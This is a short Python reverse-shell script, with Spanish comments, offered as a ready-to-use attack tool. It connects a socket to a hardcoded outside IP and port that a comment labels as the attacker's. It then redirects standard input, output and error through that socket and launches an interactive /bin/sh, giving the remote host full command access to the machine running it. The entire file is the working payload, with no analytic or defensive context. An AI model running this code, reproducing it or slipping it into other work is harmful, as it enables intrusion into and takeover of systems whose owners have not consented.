#!/usr/bin/python3
import socket
import subprocess
import os

# Configura tu IP y puerto aquí
IP = "167.60.62.81"  # Cambia a tu IP atacante
PORT = 8080  # Cambia al puerto que deseas usar

# Crea un socket y se conecta al servidor atacante
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    os.dup2(s.fileno(), 0)  # Redirige la entrada estándar
    os.dup2(s.fileno(), 1)  # Redirige la salida estándar
    os.dup2(s.fileno(), 2)  # Redirige los errores estándar
    subprocess.call(["/bin/sh", "-i"])  # Inicia una shell interactiva
except Exception as e:
    print(f"Error: {e}")
